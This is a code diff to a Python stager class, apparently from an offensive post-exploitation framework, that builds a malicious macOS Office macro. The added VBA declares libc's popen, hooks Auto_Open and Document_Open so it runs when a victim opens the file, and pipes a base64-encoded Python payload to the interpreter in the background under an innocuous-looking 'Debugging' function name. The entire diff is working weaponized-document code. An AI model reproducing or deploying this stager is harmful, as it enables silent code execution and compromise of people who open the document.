@@ -91,26 +91,49 @@ class Stager:
                 payload = formStr("cmd", match)
 
             macro = """
-#If MAC_OFFICE_VERSION >= 15.33 Then
-    Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String) As LongPtr
-#Else
-    #If VBA7 Then
-        Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
+#If Mac Then
+    #If MAC_OFFICE_VERSION >= 15.33 Then
+        Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String) As LongPtr
     #Else
-        Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
-    #EndIf
-#EndIf
+        #If VBA7 Then
+            Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
+        #Else
+            Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
+        #End If
+    #End If
+#End If
 
-Private Sub Workbook_Open()
-    If Val(Application.Version) >= 15.33 Then
-        Dim result As LongPtr
-    Else
-        Dim result As Long
-    End If
-    Dim cmd As String
-    %s
-    result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+Sub Auto_Open()
+    MsgBox("Auto_Open()")
+    Debugging
 End Sub
-""" %(payload)
+
+Sub Document_Open()
+    MsgBox("Document_Open()")
+    Debugging
+End Sub
+
+Public Function Debugging() As Variant
+    On Error Resume Next
+            Dim tracking As String
+            tracking = "%s"
+            #If Mac Then
+                'Mac Rendering
+                If Val(Application.Version) >= 15.33 Then
+                    Dim result As LongPtr
+                    Dim cmd As String
+                    %s
+                    MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                    result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                Else
+                    Dim result2 As Long
+                    Dim cmd As String
+                    %s
+                    MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                    result2 = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                End If
+
+            #End If
+End Function""" %(payload)
 
             return macro
